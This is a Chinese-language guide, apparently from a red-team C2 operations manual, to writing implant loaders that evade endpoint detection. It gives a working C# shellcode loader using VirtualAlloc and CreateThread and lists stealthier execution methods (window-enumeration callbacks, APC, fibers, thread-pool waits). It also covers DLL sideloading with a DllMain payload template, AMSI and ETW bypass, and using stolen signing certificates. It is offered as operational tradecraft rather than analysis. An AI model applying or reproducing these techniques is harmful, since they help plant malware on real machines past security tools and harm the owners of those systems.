# Implant 加载器开发

被 `c2-framework-ops` 引用。

**解决的问题**：框架生成的 implant 直接落盘会被 EDR 扫到。
加载器的作用是「让 implant 在内存里跑起来，不落盘或落一个无害的外壳」。

---

## 一、三种加载形态（按隐蔽性排序）

| 形态 | 落盘内容 | EDR 能看到 | 隐蔽性 | 成本 |
| --- | --- | --- | --- | --- |
| **直接 exe** | implant 本体 | 未签名 exe + 从 Temp 执行 | 低 | 极低 |
| **stager** | 一个小 loader | loader 行为（下载+执行） | 中 | 低 |
| **shellcode loader** | 一个「看起来正常」的 exe | loader 行为（内存分配+执行） | 中高 | 中 |
| **DLL sideload** | 一个未签名 DLL + 合法 exe | 合法进程加载未签名 DLL | **高** | 中 |

**判据**：**目标有没有 EDR** 决定用哪种。
- 无 EDR → 直接 exe（省事，且本来就没人在看）
- 有 EDR 但无行为检测（只有静态扫描）→ shellcode loader（改一下特征就过）
- 有行为检测（看 API 调用序列）→ DLL sideload（复用合法进程的信誉）

---

## 二、Shellcode Loader 的最小实现

### 2.1 原理

```text
implant（shellcode 形态）本身不能被"直接运行"（它是位置无关的机器码）。
loader 要做四件事：
  ① 分配一块可执行内存（VirtualAlloc RWX 或 RW→RX）
  ② 把 shellcode 拷进去
  ③ 创建线程执行（CreateThread 或更隐蔽的替代）
  ④ 等待（否则进程退出 shellcode 也就没了）
```

### 2.2 C# 版本（最容易写，也最容易被杀）

```csharp
using System;
using System.Runtime.InteropServices;

class Loader {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main() {
        byte[] buf = new byte[] { 0xfc, 0x48, 0x83, /* ... shellcode ... */ };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);  // MEM_COMMIT|RESERVE, RWX
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr h = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
```

**这个版本 100% 被 Defender 杀**（`VirtualAlloc RWX + CreateThread` 是最经典的组合，
所有 AV 都有专门规则）。它只适合"目标完全没防护"的场景。

### 2.3 改进方向（每一条都对应一个检测点）

| 检测点 | 改进 |
| --- | --- |
| `VirtualAlloc RWX` | 先 RW，写入后再 `VirtualProtect` 改 RX（分两步） |
| `CreateThread` 指向非模块内存 | 用 `QueueUserAPC` / `CreateFiber` / 回调函数（`EnumWindows` 回调等） |
| 未签名 exe | 签名（买证书 / 偷证书 / 用合法程序的副本） |
| 静态特征（shellcode 的字节） | 加密 shellcode，运行时解密（密钥不硬编码） |
| 行为序列 | 加延迟、加无害 API 调用做混淆 |

### 2.4 更隐蔽的执行方式（按隐蔽性）

```text
① 回调执行（callback execution）—— 不创建线程
   EnumWindows(callback, 0)  // callback 指向 shellcode
   EnumChildWindows / EnumDesktopWindows / EnumFonts 同理
   判据：EDR 通常不监控"枚举回调指向非模块内存"

② APC 注入到当前进程的线程
   QueueUserAPC(shellcode_addr, thread_handle, 0)
   然后让该线程进入可警报状态（SleepEx）

③ 线程池回调（Win7+）
   TpAllocWait + TpSetWait 的回调指向 shellcode

④ Fiber（纤程）
   ConvertThreadToFiber → CreateFiber(shellcode) → SwitchToFiber
   判据：非常规执行路径，部分 EDR 不覆盖
```

**判据**：**每换一种执行方式，就要验证 EDR 是不是还在抓**。
不要假设"用了回调就安全" —— 现代 EDR（CrowdStrike/Defender ATP）覆盖了这些路径。

---

## 三、DLL Sideload（隐蔽性最高）

### 3.1 原理

```text
找一个**会从自己所在目录加载 DLL** 的合法签名程序。
把恶意 DLL 命名成它要加载的名字，放在同目录。
启动它 → 它加载你的 DLL → 你的 DLL 起 C2 → 程序照常工作（用户看不出异常）。

关键前提：Windows 的 DLL 搜索顺序里，**exe 所在目录优先于 System32**（多数情况）。
```

### 3.2 怎么找可劫持的程序

```bash
# ── 方法 1：Process Monitor（最准，但要手工看）──
# 过滤：Path ends with .dll + Result is NAME NOT FOUND
# 判据：某个 DLL "NAME NOT FOUND" 且它不在 System32 里 → 可能可劫持

# ── 方法 2：看已知的 sideload 案例（省事）──
# 很多红队工具/输入法/更新器都有公开的 sideload 记录
# 搜 "<程序名> dll sideload" 或看 LOLBAS 项目
```

### 3.3 典型可劫持目标（都是常见软件）

| 程序 | 可劫持 DLL | 说明 |
| --- | --- | --- |
| 各类输入法 | 版本检查 DLL | 常从自身目录加载 |
| 更新器（各类软件的 updater） | 更新逻辑 DLL | 常无签名校验 |
| 部分安全软件的组件 | 白名单内的 DLL | 反讽但真实存在 |
| 常见办公软件的加载项 | 加载项 DLL | |

> **不要在这里列具体文件名** —— 会过期，且不同版本不同。
> 用 Process Monitor 在**目标环境里**实测，比查任何列表都准。

### 3.4 DLL 的构造

```c
// 最小 DLL（DllMain 里起 C2）
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // 在这里执行 shellcode 或加载 implant
        // 注意：DllMain 里不能做复杂操作（加载器锁），
        // 正确做法是起一个线程，让真正的工作在线程里做
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    }
    return TRUE;
}
```

**DllMain 的坑（很重要）**：`DllMain` 里**不能调用 `LoadLibrary`/`CreateProcess`/等待同步对象**，
会导致加载器死锁。所有复杂操作必须放到新线程里。

---

## 四、免杀的最后一道：ETW / AMSI

```text
即使 shellcode 在内存里跑起来了，还可能被：
  · AMSI 拦（.NET/PowerShell/VBScript 的脚本内容扫描）
  · ETW 记录（.NET 程序集加载、PowerShell 脚本块）

如果你的 loader 是 .NET：
  → AMSI 会扫你的程序集（`AmsiScanBuffer`）
  → 绕过方式见 `edr-bypass-re`（patch amsi.dll 或 hook AmsiScanBuffer）

如果你的 loader 是 C/C++（原生）：
  → 不走 AMSI（AMSI 只管脚本和 .NET）
  → 但 ETW 仍会记录进程/线程创建
```

**判据（该不该做免杀）**：
**先测一次**。直接跑你的 loader，看 Defender 有没有反应。
- 没反应 → 不需要免杀，继续
- 被删 → 先改执行方式（回调 vs 线程），再考虑 patch AMSI/ETW

**不要一开始就上全套免杀** —— 那是浪费时间，且更容易触发行为检测（patch 内存是强特征）。

---

## 五、验伤（loader 是否真的成功）

```text
① 进程在不在
   tasklist | findstr <你的进程名>
   判据：进程存在 = loader 起来了

② C2 上有没有 session
   这是唯一可靠的判据 —— 进程活着但 C2 没连上，等于没成功

③ 进程的行为是否正常（如果你寄生了合法程序）
   判据：合法程序的功能还能用（用户视角无异常）
   如果程序崩了，说明 DllMain 里的操作破坏了它的初始化
```

**三类假成功**：

1. **loader 进程起来了但立刻退出** —— shellcode 执行失败（常见的：x86/x64 不匹配）。
2. **进程活着但 C2 没 session** —— implant 的配置错了（C2 地址/profile）；不是 loader 的问题。
3. **DLL 加载了但程序崩溃** —— `DllMain` 里做了不该做的事（见上面的坑）。

---

## 六、常见坑

1. **`VirtualAlloc RWX` + `CreateThread`** —— 最经典的被杀组合。必须换。
2. **x86 loader 跑 x64 shellcode**（或反之）—— 直接崩。生成 implant 时要对齐架构。
3. **`DllMain` 里做复杂操作** —— 加载器死锁，程序卡死。必须起线程。
4. **shellcode 硬编码在源码里** —— 静态扫描直接命中。加密 + 运行期解密。
5. **没测就上全套免杀** —— 先裸测一次，多数场景不需要。
6. **忘了 zipalign 之类的顺序问题**（移动端同理）—— 二进制也有类似的"顺序依赖"：
   **先分配再解密再改权限**，顺序错了就崩。
7. **签名问题** —— 未签名 exe 在很多环境直接被拦。用一个合法程序的副本做宿主（sideload）
   比自己做签名便宜得多。